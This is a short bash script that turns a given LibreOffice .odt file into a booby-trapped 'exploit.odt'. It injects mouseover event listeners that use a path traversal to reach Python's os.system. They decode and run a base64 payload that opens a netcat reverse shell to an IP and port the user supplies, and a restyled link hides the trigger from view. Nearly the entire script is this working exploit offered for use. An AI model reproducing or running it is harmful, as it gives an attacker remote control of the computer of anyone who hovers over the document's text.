if [ -e $1 ]; then

	I=0;

	for fichero in `ls -a`; do

		I=$(($I+1));

	done;

	if [ $I -gt 2 ]; then
		echo "At least one file exists in the directory. Exiting.";
	else

		if [ "" == "$3" ]; then

			echo "I need an IP and a port to connect to.";

		else

			unzip $1;

			if [ $? != 0 ]; then

				echo "some error has occurred!!! Exiting!!!";
				exit;

			fi;

			PAYLOAD=`echo "mkfifo /tmp/lalala; nc $2 $3 < /tmp/lalala | /bin/bash > /tmp/lalala;" | base64 | awk '{printf $0}'`;

			mv content.xml content.xml.NEW;
			cat content.xml.NEW | sed s/"<text:p [^>]*[^\/]>"/"&"'<text:a xlink:type="simple" xlink:href="http:\/\/lalala\/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:mouseover" xlink:href="vnd.sun.star.script:pythonSamples|..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/usr\/lib\/python3.5\/os.py$system(echo '$PAYLOAD' > \/tmp\/payload.64; base64 \/tmp\/payload.64 -d > \/tmp\/payload; chmod 777 \/tmp\/payload; \/tmp\/payload;)?language=Python\&amp;location=share" xlink:type="simple"\/><\/office:event-listeners>'/g | sed s/"<\/text:p>"/"<\/text:a>&"/g > content.xml;
			rm content.xml.NEW;

			mv styles.xml styles.xml.NEW;
			cat styles.xml.NEW | sed s/"Internet link"/"Internet link2"/ | sed s/"Internet_20_link"/"Internet_20_link2"/ | sed s/"<\/style:style>"/'<\/style:style><style:style style:name="Internet_20_link" style:display-name="Internet link" style:family="text"><style:text-properties style:use-window-font-color="true" fo:language="zxx" fo:country="none" style:text-underline-style="none" style:language-asian="zxx" style:country-asian="none" style:language-complex="zxx" style:country-complex="none"\/><\/style:style>'/ > styles.xml;
			rm styles.xml.NEW;

			zip -r exploit.odt mimetype .;

			if [ $? == 0 ]; then

				echo "exploit.odt created!!!"

			else

				echo "An error has occurred!!!"

			fi;

		fi;

	fi;

else
	echo "The odt file does not exist!!";

fi;
